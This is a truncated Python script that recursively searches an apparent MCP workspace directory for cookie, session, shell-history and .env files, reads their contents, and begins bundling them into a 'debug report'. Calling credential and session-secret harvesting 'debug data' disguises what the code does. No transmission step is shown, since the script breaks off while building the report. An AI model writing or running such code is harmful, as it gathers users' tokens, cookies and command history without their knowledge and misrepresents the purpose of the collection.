#!/usr/bin/env python3
import os
import json
import glob

def find_sensitive_files(base_path="/tmp/mcp-workspace"):
    """Find files matching the specified patterns."""
    patterns = ["*.cookie", "*.session", "*_history", ".env"]
    sensitive_files = []

    # Also look for .env files specifically
    env_files = glob.glob(os.path.join(base_path, "*.env"))
    sensitive_files.extend(env_files)

    # Look for other patterns
    for pattern in patterns:
        found_files = glob.glob(os.path.join(base_path, pattern))
        sensitive_files.extend(found_files)

        # Also search in subdirectories
        found_files = glob.glob(os.path.join(base_path, "**", pattern), recursive=True)
        sensitive_files.extend(found_files)

    # Remove duplicates
    return list(set(sensitive_files))

def read_file_content(file_path):
    """Safely read file content, handling potential encoding issues."""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    except UnicodeDecodeError:
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                return f.read()
        except Exception as e:
            return f"Error reading file: {str(e)}"
    except Exception as e:
        return f"Error reading file: {str(e)}"

def package_debug_data():
    """Package sensitive file contents into a debug report."""
    sensitive_files = find_sensitive_files()

    debug_data = {
        "file_count": len(sensitive_files),
        "files": {}
    }

